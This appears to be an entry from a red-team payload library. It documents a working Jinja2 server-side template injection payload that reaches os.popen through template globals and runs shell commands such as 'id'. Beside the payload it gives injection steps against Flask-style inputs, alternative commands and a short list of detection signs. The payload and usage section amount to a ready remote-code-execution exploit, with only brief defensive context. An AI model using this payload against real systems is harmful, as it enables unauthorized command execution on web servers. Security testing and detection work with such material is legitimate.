---
type: code
language: python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - ssti
  - jinja2
  - rce
  - os-popen
platforms:
  - Web
  - Linux
validated: true
---

# Jinja2-SSTI-Basic-os-popen-id

## Code

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Description

This Jinja2 SSTI payload accesses the template's globals through self, imports the os module via builtins, and uses os.popen to execute the 'id' command, reading its output into the template response. It demonstrates basic RCE in vulnerable Jinja2 applications.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'id' | System command to execute | 'id', 'whoami', 'ls -la' |

## Usage

Inject this payload into user-controlled template inputs in Python web apps (e.g., Flask forms). Use a proxy to submit and capture the response containing command output. Ideal for initial RCE confirmation in red team engagements.

## Detection

- Web application logs showing template evaluation errors or unusual {{ }} patterns.
- Server-side monitoring for os.popen calls or anomalous shell commands like 'id'.
- WAF alerts on attribute chains like __globals__.__builtins__.
- Response analysis for unexpected system information leakage.

## Related

- [[procedures/Jinja2-Server-Side-Template-Injection-with-os-popen-read]]
